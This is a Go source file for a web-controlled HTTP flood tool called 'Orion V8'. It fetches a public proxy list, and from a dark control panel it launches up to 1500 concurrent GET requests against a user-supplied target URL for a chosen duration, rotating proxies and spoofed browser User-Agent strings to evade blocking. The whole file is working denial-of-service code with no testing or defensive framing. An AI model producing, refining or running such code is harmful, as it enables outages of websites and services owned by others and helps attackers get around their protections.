package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	proxyListURL    = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
	maxActiveReqs   = 1500
	maxIdleConns    = 1000
	refreshInterval = 10 * time.Minute
)

var referrers = []string{"https://www.google.com/", "https://www.facebook.com/", "https://www.bing.com/", "https://www.duckduckgo.com/", "https://www.wikipedia.org/"}
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
		"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
		"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
}

var (
	proxyPool    []*url.URL
	poolMu       sync.RWMutex
	stats        struct{ Requests, Errors uint64 }
	engineActive int32
	cancelFunc   context.CancelFunc
)

func main() {
	debug.SetGCPercent(150)
	loadProxies()

	go func() {
		for range time.Tick(refreshInterval) { loadProxies() }
	}()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, modernHTML) })
	http.HandleFunc("/start", handleStart)
	http.HandleFunc("/stop", handleStop)
	http.HandleFunc("/stats", handleStats)

	port := os.Getenv("PORT")
	if port == "" { port = "10000" }

	// 
	log.Printf("Orion V8 Active on 0.0.0.0:%s", port)
	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, nil))
}

func handleStart(w http.ResponseWriter, r *http.Request) {
	if atomic.LoadInt32(&engineActive) == 1 { return }
	target := r.FormValue("target")
	duration, _ := strconv.Atoi(r.FormValue("duration"))
	
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	cancelFunc = cancel
	atomic.StoreInt32(&engineActive, 1)

	go func() {
		defer atomic.StoreInt32(&engineActive, 0)
		tr := &http.Transport{
			DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
			MaxIdleConns: maxIdleConns,
			Proxy: func(req *http.Request) (*url.URL, error) {
				poolMu.RLock()
				defer poolMu.RUnlock()
				if len(proxyPool) == 0 { return nil, nil }
				return proxyPool[time.Now().UnixNano()%int64(len(proxyPool))], nil
			},
		}
		client := &http.Client{Transport: tr, Timeout: 8 * time.Second}
		sem := make(chan struct{}, maxActiveReqs)
		for {
			select {
			case <-ctx.Done(): return
			default:
				sem <- struct{}{}
				go func() {
					defer func() { <-sem }()
					req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
					req.Header.Set("User-Agent", userAgents[time.Now().UnixNano()%int64(len(userAgents))])
					resp, err := client.Do(req)
					if err != nil { atomic.AddUint64(&stats.Errors, 1); return }
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&stats.Requests, 1)
				}()
			}
		}
	}()
}

func handleStop(w http.ResponseWriter, r *http.Request) { if cancelFunc != nil { cancelFunc() } }

func handleStats(w http.ResponseWriter, r *http.Request) {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"req": atomic.LoadUint64(&stats.Requests), "err": atomic.LoadUint64(&stats.Errors),
		"ram": m.Alloc / 1024 / 1024, "active": atomic.LoadInt32(&engineActive) == 1,
	})
}

func loadProxies() {
	resp, err := http.Get(proxyListURL)
	if err != nil { return }
	defer resp.Body.Close()
	var newPool []*url.URL
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		if u, err := url.Parse(scanner.Text()); err == nil { newPool = append(newPool, u) }
	}
	poolMu.Lock()
	proxyPool = newPool
	poolMu.Unlock()
}

const modernHTML = `
<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #0a0a0a; color: #e0e0e0; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 450px; background: #121212; border: 1px solid #333; padding: 30px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #00ffcc; font-size: 0.9rem; letter-spacing: 4px; text-transform: uppercase; margin-bottom: 25px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .stat { background: #1a1a1a; padding: 15px; border-left: 2px solid #00ffcc; }
        .val { font-size: 1.2rem; font-weight: bold; color: #fff; }
        .label { font-size: 0.6rem; color: #888; text-transform: uppercase; }
        input { width: 100%; background: #000; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #00ffcc; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Orion Systems</h2>
        <div class="grid">
            <div class="stat"><div class="label">Requests</div><div class="val" id="r">0</div></div>
            <div class="stat"><div class="label">Memory (MB)</div><div class="val" id="m">0</div></div>
        </div>
        <input id="t" value="https://google.com">
        <input id="d" value="3600">
        <button onclick="start()">INITIATE SEQUENCE</button>
        <button onclick="fetch('/stop')" style="background:none; border:1px solid #444; color:#666; margin-top:10px;">TERMINATE</button>
    </div>
    <script>
        async function start(){ await fetch('/start?target='+document.getElementById('t').value+'&duration='+document.getElementById('d').value); }
        setInterval(async () => {
            const res = await (await fetch('/stats')).json();
            document.getElementById('r').innerText = res.req;
            document.getElementById('m').innerText = res.ram;
        }, 1000);
    </script>
</body>
</html>`
